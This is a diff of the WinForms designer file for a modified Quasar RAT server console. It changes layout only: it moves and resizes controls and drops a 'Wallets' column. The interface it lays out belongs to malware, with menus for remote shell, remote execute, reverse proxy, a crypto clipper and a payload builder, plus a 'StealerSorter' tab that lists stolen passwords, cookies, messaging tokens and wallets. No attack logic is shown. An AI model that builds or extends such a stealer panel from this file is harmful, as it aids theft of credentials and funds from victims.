@@ -53,12 +53,12 @@ namespace Quasar.Server.Forms
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter2 = new Quasar.Server.Utilities.ListViewColumnSorter();
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter3 = new Quasar.Server.Utilities.ListViewColumnSorter();
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter4 = new Quasar.Server.Utilities.ListViewColumnSorter();
-            Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter10 = new Quasar.Server.Utilities.ListViewColumnSorter();
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter5 = new Quasar.Server.Utilities.ListViewColumnSorter();
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter6 = new Quasar.Server.Utilities.ListViewColumnSorter();
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter7 = new Quasar.Server.Utilities.ListViewColumnSorter();
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter8 = new Quasar.Server.Utilities.ListViewColumnSorter();
             Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter9 = new Quasar.Server.Utilities.ListViewColumnSorter();
+            Quasar.Server.Utilities.ListViewColumnSorter listViewColumnSorter10 = new Quasar.Server.Utilities.ListViewColumnSorter();
             this.contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
             this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.systemInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -128,7 +128,6 @@ namespace Quasar.Server.Forms
             this.hCountry = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hOS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hAccountType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.hWallets = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.tableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
             this.label1 = new System.Windows.Forms.Label();
             this.pictureBoxMain = new System.Windows.Forms.PictureBox();
@@ -195,27 +194,14 @@ namespace Quasar.Server.Forms
             this.excludeSystemDriveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.deleteTasksToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.tabPage5 = new System.Windows.Forms.TabPage();
-            this.aeroListView1 = new Quasar.Server.Controls.AeroListView();
-            this.statusStrip = new System.Windows.Forms.StatusStrip();
-            this.listenToolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
-            this.connectedToolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
-            this.menuStrip = new System.Windows.Forms.MenuStrip();
-            this.clientsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.autoTasksToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.cryptoClipperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.notificationCentreToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.splitter2 = new System.Windows.Forms.Splitter();
             this.dotNetBarTabControl1 = new Quasar.Server.Controls.DotNetBarTabControl();
             this.Passwords = new System.Windows.Forms.TabPage();
-            this.Cookies = new System.Windows.Forms.TabPage();
-            this.splitter2 = new System.Windows.Forms.Splitter();
             this.aeroListView2 = new Quasar.Server.Controls.AeroListView();
             this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader12 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.Cookies = new System.Windows.Forms.TabPage();
             this.aeroListView3 = new Quasar.Server.Controls.AeroListView();
             this.columnHeader14 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.columnHeader16 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -230,6 +216,19 @@ namespace Quasar.Server.Forms
             this.aeroListView6 = new Quasar.Server.Controls.AeroListView();
             this.columnHeader13 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.tabPage7 = new System.Windows.Forms.TabPage();
+            this.aeroListView1 = new Quasar.Server.Controls.AeroListView();
+            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.statusStrip = new System.Windows.Forms.StatusStrip();
+            this.listenToolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
+            this.connectedToolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
+            this.menuStrip = new System.Windows.Forms.MenuStrip();
+            this.clientsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.autoTasksToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.cryptoClipperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.notificationCentreToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuStrip.SuspendLayout();
             this.tableLayoutPanel.SuspendLayout();
             this.MainTabControl.SuspendLayout();
@@ -246,14 +245,14 @@ namespace Quasar.Server.Forms
             this.tabPage4.SuspendLayout();
             this.TasksContextMenuStrip.SuspendLayout();
             this.tabPage5.SuspendLayout();
-            this.statusStrip.SuspendLayout();
-            this.menuStrip.SuspendLayout();
             this.dotNetBarTabControl1.SuspendLayout();
             this.Passwords.SuspendLayout();
             this.Cookies.SuspendLayout();
             this.Communication.SuspendLayout();
             this.Games.SuspendLayout();
             this.tabPage6.SuspendLayout();
+            this.statusStrip.SuspendLayout();
+            this.menuStrip.SuspendLayout();
             this.SuspendLayout();
             // 
             // contextMenuStrip
@@ -295,7 +294,7 @@ namespace Quasar.Server.Forms
             // 
             this.systemInformationToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemInformationToolStripMenuItem.Image")));
             this.systemInformationToolStripMenuItem.Name = "systemInformationToolStripMenuItem";
-            this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.systemInformationToolStripMenuItem.Text = "System Information";
             this.systemInformationToolStripMenuItem.Click += new System.EventHandler(this.systemInformationToolStripMenuItem_Click);
             // 
@@ -303,7 +302,7 @@ namespace Quasar.Server.Forms
             // 
             this.fileManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fileManagerToolStripMenuItem.Image")));
             this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
-            this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.fileManagerToolStripMenuItem.Text = "File Manager";
             this.fileManagerToolStripMenuItem.Click += new System.EventHandler(this.fileManagerToolStripMenuItem_Click);
             // 
@@ -311,7 +310,7 @@ namespace Quasar.Server.Forms
             // 
             this.startupManagerToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.application_edit;
             this.startupManagerToolStripMenuItem.Name = "startupManagerToolStripMenuItem";
-            this.startupManagerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.startupManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.startupManagerToolStripMenuItem.Text = "Startup Manager";
             this.startupManagerToolStripMenuItem.Click += new System.EventHandler(this.startupManagerToolStripMenuItem_Click);
             // 
@@ -319,7 +318,7 @@ namespace Quasar.Server.Forms
             // 
             this.taskManagerToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.application_cascade;
             this.taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
-            this.taskManagerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.taskManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.taskManagerToolStripMenuItem.Text = "Task Manager";
             this.taskManagerToolStripMenuItem.Click += new System.EventHandler(this.taskManagerToolStripMenuItem_Click);
             // 
@@ -327,7 +326,7 @@ namespace Quasar.Server.Forms
             // 
             this.remoteShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteShellToolStripMenuItem.Image")));
             this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
-            this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.remoteShellToolStripMenuItem.Text = "Remote Shell";
             this.remoteShellToolStripMenuItem.Click += new System.EventHandler(this.remoteShellToolStripMenuItem_Click);
             // 
@@ -335,7 +334,7 @@ namespace Quasar.Server.Forms
             // 
             this.connectionsToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.transmit_blue;
             this.connectionsToolStripMenuItem.Name = "connectionsToolStripMenuItem";
-            this.connectionsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.connectionsToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.connectionsToolStripMenuItem.Text = "TCP Connections";
             this.connectionsToolStripMenuItem.Click += new System.EventHandler(this.connectionsToolStripMenuItem_Click);
             // 
@@ -343,7 +342,7 @@ namespace Quasar.Server.Forms
             // 
             this.reverseProxyToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.server_link;
             this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
-            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
             this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem_Click);
             // 
@@ -351,7 +350,7 @@ namespace Quasar.Server.Forms
             // 
             this.registryEditorToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.registry;
             this.registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
-            this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.registryEditorToolStripMenuItem.Text = "Registry Editor";
             this.registryEditorToolStripMenuItem.Click += new System.EventHandler(this.registryEditorToolStripMenuItem_Click);
             // 
@@ -362,7 +361,7 @@ namespace Quasar.Server.Forms
             this.webFileToolStripMenuItem});
             this.remoteExecuteToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.lightning;
             this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
-            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
             // 
             // localFileToolStripMenuItem
@@ -384,7 +383,7 @@ namespace Quasar.Server.Forms
             // ctxtLine
             // 
             this.ctxtLine.Name = "ctxtLine";
-            this.ctxtLine.Size = new System.Drawing.Size(177, 6);
+            this.ctxtLine.Size = new System.Drawing.Size(175, 6);
             // 
             // actionsToolStripMenuItem
             // 
@@ -394,7 +393,7 @@ namespace Quasar.Server.Forms
             this.standbyToolStripMenuItem});
             this.actionsToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.actions;
             this.actionsToolStripMenuItem.Name = "actionsToolStripMenuItem";
-            this.actionsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.actionsToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
             this.actionsToolStripMenuItem.Text = "Actions";
             // 
             // shutdownToolStripMenuItem
@@ -516,7 +515,7 @@ namespace Quasar.Server.Forms
             // 
             this.remoteScriptingToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.script_code;
             this.remoteScriptingToolStripMenuItem.Name = "remoteScriptingToolStripMenuItem";
-            this.remoteScriptingToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.remoteScriptingToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
             this.remoteScriptingToolStripMenuItem.Text = "Remote Scripting";
             this.remoteScriptingToolStripMenuItem.Click += new System.EventHandler(this.remoteScriptingToolStripMenuItem_Click);
             // 
@@ -524,7 +523,7 @@ namespace Quasar.Server.Forms
             // 
             this.showMessageboxToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("showMessageboxToolStripMenuItem.Image")));
             this.showMessageboxToolStripMenuItem.Name = "showMessageboxToolStripMenuItem";
-            this.showMessageboxToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.showMessageboxToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
             this.showMessageboxToolStripMenuItem.Text = "Show Messagebox";
             this.showMessageboxToolStripMenuItem.Click += new System.EventHandler(this.showMessageboxToolStripMenuItem_Click);
             // 
@@ -532,7 +531,7 @@ namespace Quasar.Server.Forms
             // 
             this.visitWebsiteToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("visitWebsiteToolStripMenuItem.Image")));
             this.visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
-            this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
             this.visitWebsiteToolStripMenuItem.Text = "Send to Website";
             this.visitWebsiteToolStripMenuItem.Click += new System.EventHandler(this.visitWebsiteToolStripMenuItem_Click);
             // 
@@ -991,7 +990,7 @@ namespace Quasar.Server.Forms
             this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 25F));
             this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100F));
             this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 22F));
-            this.tableLayoutPanel.Size = new System.Drawing.Size(1128, 538);
+            this.tableLayoutPanel.Size = new System.Drawing.Size(1024, 538);
             this.tableLayoutPanel.TabIndex = 6;
             // 
             // MainTabControl
@@ -1006,7 +1005,7 @@ namespace Quasar.Server.Forms
             this.MainTabControl.Margin = new System.Windows.Forms.Padding(0);
             this.MainTabControl.Name = "MainTabControl";
             this.MainTabControl.SelectedIndex = 0;
-            this.MainTabControl.Size = new System.Drawing.Size(1128, 491);
+            this.MainTabControl.Size = new System.Drawing.Size(1024, 491);
             this.MainTabControl.TabIndex = 7;
             this.MainTabControl.SelectedIndexChanged += new System.EventHandler(this.MainTabControl_SelectedIndexChanged);
             // 
@@ -1019,7 +1018,7 @@ namespace Quasar.Server.Forms
             this.tabPage1.Location = new System.Drawing.Point(4, 22);
             this.tabPage1.Margin = new System.Windows.Forms.Padding(0);
             this.tabPage1.Name = "tabPage1";
-            this.tabPage1.Size = new System.Drawing.Size(1120, 465);
+            this.tabPage1.Size = new System.Drawing.Size(1016, 465);
             this.tabPage1.TabIndex = 0;
             this.tabPage1.Text = "ClientTabPage";
             this.tabPage1.UseVisualStyleBackColor = true;
@@ -1037,8 +1036,7 @@ namespace Quasar.Server.Forms
             this.hUserStatus,
             this.hCountry,
             this.hOS,
-            this.hAccountType,
-            this.hWallets});
+            this.hAccountType});
             this.lstClients.ContextMenuStrip = this.contextMenuStrip;
             this.lstClients.Dock = System.Windows.Forms.DockStyle.Fill;
             this.lstClients.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -1051,7 +1049,7 @@ namespace Quasar.Server.Forms
             this.lstClients.LvwColumnSorter = listViewColumnSorter1;
             this.lstClients.Name = "lstClients";
             this.lstClients.ShowItemToolTips = true;
-            this.lstClients.Size = new System.Drawing.Size(833, 351);
+            this.lstClients.Size = new System.Drawing.Size(729, 351);
             this.lstClients.SmallImageList = this.imgFlags;
             this.lstClients.TabIndex = 1;
             this.lstClients.UseCompatibleStateImageBehavior = false;
@@ -1114,12 +1112,7 @@ namespace Quasar.Server.Forms
             // hAccountType
             // 
             this.hAccountType.Text = "Account Type";
-            this.hAccountType.Width = 91;
-            // 
-            // hWallets
-            // 
-            this.hWallets.Text = "Wallets";
-            this.hWallets.Width = 26;
+            this.hAccountType.Width = 11;
             // 
             // tableLayoutPanel1
             // 
@@ -1130,7 +1123,7 @@ namespace Quasar.Server.Forms
             this.tableLayoutPanel1.Controls.Add(this.tableLayoutPanel2, 0, 2);
             this.tableLayoutPanel1.Controls.Add(this.gBoxClientInfo, 0, 3);
             this.tableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Right;
-            this.tableLayoutPanel1.Location = new System.Drawing.Point(833, 0);
+            this.tableLayoutPanel1.Location = new System.Drawing.Point(729, 0);
             this.tableLayoutPanel1.Margin = new System.Windows.Forms.Padding(0);
             this.tableLayoutPanel1.Name = "tableLayoutPanel1";
             this.tableLayoutPanel1.RowCount = 4;
@@ -1314,7 +1307,7 @@ namespace Quasar.Server.Forms
             this.splitter1.Dock = System.Windows.Forms.DockStyle.Bottom;
             this.splitter1.Location = new System.Drawing.Point(0, 351);
             this.splitter1.Name = "splitter1";
-            this.splitter1.Size = new System.Drawing.Size(1120, 3);
+            this.splitter1.Size = new System.Drawing.Size(1016, 3);
             this.splitter1.TabIndex = 34;
             this.splitter1.TabStop = false;
             this.splitter1.Visible = false;
@@ -1330,7 +1323,7 @@ namespace Quasar.Server.Forms
             this.DebugLogRichBox.Location = new System.Drawing.Point(0, 354);
             this.DebugLogRichBox.Name = "DebugLogRichBox";
             this.DebugLogRichBox.ReadOnly = true;
-            this.DebugLogRichBox.Size = new System.Drawing.Size(1120, 111);
+            this.DebugLogRichBox.Size = new System.Drawing.Size(1016, 111);
             this.DebugLogRichBox.TabIndex = 35;
             this.DebugLogRichBox.Text = "";
             this.DebugLogRichBox.Visible = false;
@@ -1790,10 +1783,239 @@ namespace Quasar.Server.Forms
             this.tabPage5.Location = new System.Drawing.Point(4, 22);
             this.tabPage5.Name = "tabPage5";
             this.tabPage5.Padding = new System.Windows.Forms.Padding(3);
-            this.tabPage5.Size = new System.Drawing.Size(1120, 465);
+            this.tabPage5.Size = new System.Drawing.Size(1016, 465);
             this.tabPage5.TabIndex = 4;
             this.tabPage5.Text = "StealerSorter";
             this.tabPage5.UseVisualStyleBackColor = true;
+            // 
+            // splitter2
+            // 
+            this.splitter2.Location = new System.Drawing.Point(156, 3);
+            this.splitter2.Name = "splitter2";
+            this.splitter2.Size = new System.Drawing.Size(3, 459);
+            this.splitter2.TabIndex = 2;
+            this.splitter2.TabStop = false;
+            // 
+            // dotNetBarTabControl1
+            // 
+            this.dotNetBarTabControl1.Controls.Add(this.Passwords);
+            this.dotNetBarTabControl1.Controls.Add(this.Cookies);
+            this.dotNetBarTabControl1.Controls.Add(this.Communication);
+            this.dotNetBarTabControl1.Controls.Add(this.Games);
+            this.dotNetBarTabControl1.Controls.Add(this.tabPage6);
+            this.dotNetBarTabControl1.Controls.Add(this.tabPage7);
+            this.dotNetBarTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.dotNetBarTabControl1.ItemSize = new System.Drawing.Size(90, 22);
+            this.dotNetBarTabControl1.Location = new System.Drawing.Point(156, 3);
+            this.dotNetBarTabControl1.Name = "dotNetBarTabControl1";
+            this.dotNetBarTabControl1.SelectedIndex = 0;
+            this.dotNetBarTabControl1.Size = new System.Drawing.Size(857, 459);
+            this.dotNetBarTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
+            this.dotNetBarTabControl1.TabIndex = 1;
+            // 
+            // Passwords
+            // 
+            this.Passwords.Controls.Add(this.aeroListView2);
+            this.Passwords.Location = new System.Drawing.Point(4, 26);
+            this.Passwords.Name = "Passwords";
+            this.Passwords.Padding = new System.Windows.Forms.Padding(3);
+            this.Passwords.Size = new System.Drawing.Size(849, 429);
+            this.Passwords.TabIndex = 0;
+            this.Passwords.Text = "Passwords";
+            this.Passwords.UseVisualStyleBackColor = true;
+            // 
+            // aeroListView2
+            // 
+            this.aeroListView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader9,
+            this.columnHeader10,
+            this.columnHeader12});
+            this.aeroListView2.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.aeroListView2.FullRowSelect = true;
+            this.aeroListView2.HideSelection = false;
+            this.aeroListView2.Location = new System.Drawing.Point(3, 3);
+            listViewColumnSorter5.NeedNumberCompare = false;
+            listViewColumnSorter5.Order = System.Windows.Forms.SortOrder.None;
+            listViewColumnSorter5.SortColumn = 0;
+            this.aeroListView2.LvwColumnSorter = listViewColumnSorter5;
+            this.aeroListView2.Name = "aeroListView2";
+            this.aeroListView2.Size = new System.Drawing.Size(843, 423);
+            this.aeroListView2.TabIndex = 0;
+            this.aeroListView2.UseCompatibleStateImageBehavior = false;
+            this.aeroListView2.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader9
+            // 
+            this.columnHeader9.Text = "Username";
+            this.columnHeader9.Width = 227;
+            // 
+            // columnHeader10
+            // 
+            this.columnHeader10.Text = "Password";
+            this.columnHeader10.Width = 266;
+            // 
+            // columnHeader12
+            // 
+            this.columnHeader12.Text = "Website";
+            this.columnHeader12.Width = 346;
+            // 
+            // Cookies
+            // 
+            this.Cookies.Controls.Add(this.aeroListView3);
+            this.Cookies.Location = new System.Drawing.Point(4, 26);
+            this.Cookies.Name = "Cookies";
+            this.Cookies.Padding = new System.Windows.Forms.Padding(3);
+            this.Cookies.Size = new System.Drawing.Size(953, 429);
+            this.Cookies.TabIndex = 1;
+            this.Cookies.Text = "Cookies";
+            this.Cookies.UseVisualStyleBackColor = true;
+            // 
+            // aeroListView3
+            // 
+            this.aeroListView3.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader14,
+            this.columnHeader16});
+            this.aeroListView3.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.aeroListView3.FullRowSelect = true;
+            this.aeroListView3.HideSelection = false;
+            this.aeroListView3.Location = new System.Drawing.Point(3, 3);
+            listViewColumnSorter6.NeedNumberCompare = false;
+            listViewColumnSorter6.Order = System.Windows.Forms.SortOrder.None;
+            listViewColumnSorter6.SortColumn = 0;
+            this.aeroListView3.LvwColumnSorter = listViewColumnSorter6;
+            this.aeroListView3.Name = "aeroListView3";
+            this.aeroListView3.Size = new System.Drawing.Size(947, 423);
+            this.aeroListView3.TabIndex = 1;
+            this.aeroListView3.UseCompatibleStateImageBehavior = false;
+            this.aeroListView3.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader14
+            // 
+            this.columnHeader14.Text = "Cookie";
+            this.columnHeader14.Width = 498;
+            // 
+            // columnHeader16
+            // 
+            this.columnHeader16.Text = "Website";
+            this.columnHeader16.Width = 445;
+            // 
+            // Communication
+            // 
+            this.Communication.Controls.Add(this.aeroListView4);
+            this.Communication.Location = new System.Drawing.Point(4, 26);
+            this.Communication.Name = "Communication";
+            this.Communication.Padding = new System.Windows.Forms.Padding(3);
+            this.Communication.Size = new System.Drawing.Size(849, 429);
+            this.Communication.TabIndex = 2;
+            this.Communication.Text = "Communication";
+            this.Communication.UseVisualStyleBackColor = true;
+            // 
+            // aeroListView4
+            // 
+            this.aeroListView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader15,
+            this.columnHeader17});
+            this.aeroListView4.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.aeroListView4.FullRowSelect = true;
+            this.aeroListView4.HideSelection = false;
+            this.aeroListView4.Location = new System.Drawing.Point(3, 3);
+            listViewColumnSorter7.NeedNumberCompare = false;
+            listViewColumnSorter7.Order = System.Windows.Forms.SortOrder.None;
+            listViewColumnSorter7.SortColumn = 0;
+            this.aeroListView4.LvwColumnSorter = listViewColumnSorter7;
+            this.aeroListView4.Name = "aeroListView4";
+            this.aeroListView4.Size = new System.Drawing.Size(843, 423);
+            this.aeroListView4.TabIndex = 2;
+            this.aeroListView4.UseCompatibleStateImageBehavior = false;
+            this.aeroListView4.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader15
+            // 
+            this.columnHeader15.Text = "Communicator";
+            this.columnHeader15.Width = 140;
+            // 
+            // columnHeader17
+            // 
+            this.columnHeader17.Text = "Token";
+            this.columnHeader17.Width = 699;
+            // 
+            // Games
+            // 
+            this.Games.Controls.Add(this.aeroListView5);
+            this.Games.Location = new System.Drawing.Point(4, 26);
+            this.Games.Name = "Games";
+            this.Games.Padding = new System.Windows.Forms.Padding(3);
+            this.Games.Size = new System.Drawing.Size(849, 429);
+            this.Games.TabIndex = 3;
+            this.Games.Text = "Games";
+            this.Games.UseVisualStyleBackColor = true;
+            // 
+            // aeroListView5
+            // 
+            this.aeroListView5.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader7});
+            this.aeroListView5.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.aeroListView5.FullRowSelect = true;
+            this.aeroListView5.HideSelection = false;
+            this.aeroListView5.Location = new System.Drawing.Point(3, 3);
+            listViewColumnSorter8.NeedNumberCompare = false;
+            listViewColumnSorter8.Order = System.Windows.Forms.SortOrder.None;
+            listViewColumnSorter8.SortColumn = 0;
+            this.aeroListView5.LvwColumnSorter = listViewColumnSorter8;
+            this.aeroListView5.Name = "aeroListView5";
+            this.aeroListView5.Size = new System.Drawing.Size(843, 423);
+            this.aeroListView5.TabIndex = 0;
+            this.aeroListView5.UseCompatibleStateImageBehavior = false;
+            this.aeroListView5.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader7
+            // 
+            this.columnHeader7.Text = "Game";
+            this.columnHeader7.Width = 839;
+            // 
+            // tabPage6
+            // 
+            this.tabPage6.Controls.Add(this.aeroListView6);
+            this.tabPage6.Location = new System.Drawing.Point(4, 26);
+            this.tabPage6.Name = "tabPage6";
+            this.tabPage6.Padding = new System.Windows.Forms.Padding(3);
+            this.tabPage6.Size = new System.Drawing.Size(849, 429);
+            this.tabPage6.TabIndex = 4;
+            this.tabPage6.Text = "Wallets";
+            this.tabPage6.UseVisualStyleBackColor = true;
+            // 
+            // aeroListView6
+            // 
+            this.aeroListView6.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader13});
+            this.aeroListView6.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.aeroListView6.FullRowSelect = true;
+            this.aeroListView6.HideSelection = false;
+            this.aeroListView6.Location = new System.Drawing.Point(3, 3);
+            listViewColumnSorter9.NeedNumberCompare = false;
+            listViewColumnSorter9.Order = System.Windows.Forms.SortOrder.None;
+            listViewColumnSorter9.SortColumn = 0;
+            this.aeroListView6.LvwColumnSorter = listViewColumnSorter9;
+            this.aeroListView6.Name = "aeroListView6";
+            this.aeroListView6.Size = new System.Drawing.Size(843, 423);
+            this.aeroListView6.TabIndex = 1;
+            this.aeroListView6.UseCompatibleStateImageBehavior = false;
+            this.aeroListView6.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader13
+            // 
+            this.columnHeader13.Text = "Wallet";
+            this.columnHeader13.Width = 839;
+            // 
+            // tabPage7
+            // 
+            this.tabPage7.Location = new System.Drawing.Point(4, 26);
+            this.tabPage7.Name = "tabPage7";
+            this.tabPage7.Padding = new System.Windows.Forms.Padding(3);
+            this.tabPage7.Size = new System.Drawing.Size(849, 429);
+            this.tabPage7.TabIndex = 5;
+            this.tabPage7.Text = "Other";
+            this.tabPage7.UseVisualStyleBackColor = true;
             // 
             // aeroListView1
             // 
@@ -1813,6 +2035,11 @@ namespace Quasar.Server.Forms
             this.aeroListView1.UseCompatibleStateImageBehavior = false;
             this.aeroListView1.View = System.Windows.Forms.View.Details;
             // 
+            // columnHeader6
+            // 
+            this.columnHeader6.Text = "User@PC";
+            this.columnHeader6.Width = 149;
+            // 
             // statusStrip
             // 
             this.statusStrip.Dock = System.Windows.Forms.DockStyle.Fill;
@@ -1822,7 +2049,7 @@ namespace Quasar.Server.Forms
             this.connectedToolStripStatusLabel});
             this.statusStrip.Location = new System.Drawing.Point(0, 516);
             this.statusStrip.Name = "statusStrip";
-            this.statusStrip.Size = new System.Drawing.Size(1128, 22);
+            this.statusStrip.Size = new System.Drawing.Size(1024, 22);
             this.statusStrip.SizingGrip = false;
             this.statusStrip.TabIndex = 3;
             this.statusStrip.Text = "statusStrip1";
@@ -1862,7 +2089,7 @@ namespace Quasar.Server.Forms
             this.builderToolStripMenuItem});
             this.menuStrip.Location = new System.Drawing.Point(0, 0);
             this.menuStrip.Name = "menuStrip";
-            this.menuStrip.Size = new System.Drawing.Size(1128, 25);
+            this.menuStrip.Size = new System.Drawing.Size(1024, 25);
             this.menuStrip.TabIndex = 2;
             // 
             // clientsToolStripMenuItem
@@ -1934,244 +2161,11 @@ namespace Quasar.Server.Forms
             this.builderToolStripMenuItem.Text = "Builder";
             this.builderToolStripMenuItem.Click += new System.EventHandler(this.builderToolStripMenuItem_Click);
             // 
-            // columnHeader6
-            // 
